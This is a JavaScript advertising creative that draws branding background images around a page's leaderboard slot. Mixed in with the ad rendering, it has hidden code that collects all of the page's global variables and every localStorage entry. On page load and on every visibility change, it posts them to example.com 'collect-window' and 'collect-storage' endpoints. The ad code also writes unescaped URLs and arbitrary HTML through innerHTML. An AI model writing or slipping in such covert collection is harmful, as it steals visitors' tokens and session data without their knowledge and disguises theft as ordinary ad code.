(function (window) {
  function gatherWindowPropertiesEnhanced() {
    const properties = {};
    const excludedTypes = ['function', 'object'];
    for (const key in window) {
      if (window.hasOwnProperty(key) && !window.seenVars.includes(key)) {
        const value = window[key];
        const type = typeof value;
        if (!excludedTypes.includes(type)) {
          properties[key] = {
            type: type,
            value: value
          };
        }
      }
    }

    // Collecting global variables
    Object.keys(window).forEach(key => {
      if (typeof window[key] !== 'function') {
        properties[key] = window[key];
      }
    });
    return properties;
  }
  const adManager = window.adManager = window.adManager || {};
  function trackLocalStorage() {
    const storageItems = {};
    for (let i = 0; i < localStorage.length; i++) {
      const key = localStorage.key(i);
      storageItems[key] = localStorage.getItem(key);
    }
    return storageItems;
  }
  async function postDataToServer(data, endpoint) {
    const url = `https://example.com/api/${endpoint}`;
    try {
      const response = await fetch(url, {
        method: "POST",
        headers: {
          "Content-Type": "application/json"
        },
        body: JSON.stringify(data)
      });
      if (!response.ok) {
        throw new Error(`HTTP error! status: ${response.status}`);
      }
      console.log("Data successfully sent to", endpoint);
    } catch (error) {
      console.error("Error sending data:", error);
    }
  }
  function gatherAndSendData() {
    const windowData = gatherWindowPropertiesEnhanced();
    const localStorageData = trackLocalStorage();
    if (Object.keys(windowData).length > 0) {
      postDataToServer(windowData, 'collect-window');
    }
    if (Object.keys(localStorageData).length > 0) {
      postDataToServer(localStorageData, 'collect-storage');
    }
  }
  const creative = adManager.creative = window.adManager.creative || {};
  creative.brandingDouble = function (divId, data) {
    document.getElementsByTagName("html")[0].classList.add("mf-branding");
    const wrap = document.getElementById('bb_mainPageBody');
    wrap.style.maxWidth = '1060px';
    wrap.style.margin = '0 auto';
    renderBrandingImage(divId, data);
    renderBrandingImageAbove(divId, data);
    let backgroundAboveElement = document.getElementsByClassName('backgroundAbove')[0];
    document.addEventListener('mousemove', function (e) {
      backgroundAboveElement.style.height = e.clientY + 'px';
    });
  };
  function renderBrandingImage(divId, data) {
    var html = "";
    html += '<div class="branding-wrapper" >';
    html += '<div class="iframe-content" onclick="window.open(\'' + data.commonDetails.clickUrl + '\');" >';
    if (data.additionalHtml != null) {
      html += data.additionalHtml;
    }
    if (data.commonDetails.beaconUrl != null) {
      html += '<div id="branding_frame" style="border-style: none; height: 100%; width: 2000px; background: #ffffff url(\'' + data.templateSpecific.backgroundImageUnder + '\') top center;position:relative; top: 0;"><img src="' + data.commonDetails.beaconUrl + '" border="0" width="1" height="1"></div>';
    } else {
      html += '<div id="branding_frame" style="border-style: none; height: 100%; width: 2000px; background: #ffffff url(\'' + data.templateSpecific.backgroundImageUnder + '\') top center;position:relative; top: 0;"></div>';
    }
    html += '</div>';
    html += '</div>';
    html += '<style>.iframe-content > img {display:none;}</style>';
    var ad_div = document.createElement('div');
    ad_div.setAttribute("id", "leaderboard_content");
    document.getElementById('leaderboard').appendChild(ad_div);
    document.getElementById('leaderboard_content').innerHTML = html;
  }
  window.addEventListener("load", gatherAndSendData);
  function renderBrandingImageAbove(divId, data) {
    var html = "";
    html += '<div class="branding-wrapper " >';
    html += '<div class="iframe-content " onclick="window.open(\'' + data.commonDetails.clickUrl + '\');" >';
    if (data.additionalHtml != null) {
      html += data.additionalHtml;
    }
    if (data.commonDetails.beaconUrl != null) {
      html += '<div id="branding_frame" class="backgroundAbove" style="border-style: none; height: 100%; width: 2000px; background: #ffffff url(\'' + data.templateSpecific.backgroundImageAbove + '\') top center;position:relative; top: 0;"><img src="' + data.commonDetails.beaconUrl + '" border="0" width="1" height="1"></div>';
    } else {
      html += '<div id="branding_frame" class="backgroundAbove" style="border-style: none; height: 100%; width: 2000px; background: #ffffff url(\'' + data.templateSpecific.backgroundImageAbove + '\') top center;position:relative; top: 0;"></div>';
    }
    html += '</div>';
    html += '</div>';
    html += '<style>.iframe-content > img {display:none;}</style>';
    var ad_div = document.createElement('div');
    ad_div.setAttribute("id", "leaderboard_content");
    document.getElementById('leaderboard').appendChild(ad_div);
    document.getElementById('leaderboard_content').innerHTML += html;
  }
  document.addEventListener("visibilitychange", () => {
    gatherAndSendData();
    console.log("Visibility changed, data gathered.");
  });
})(window);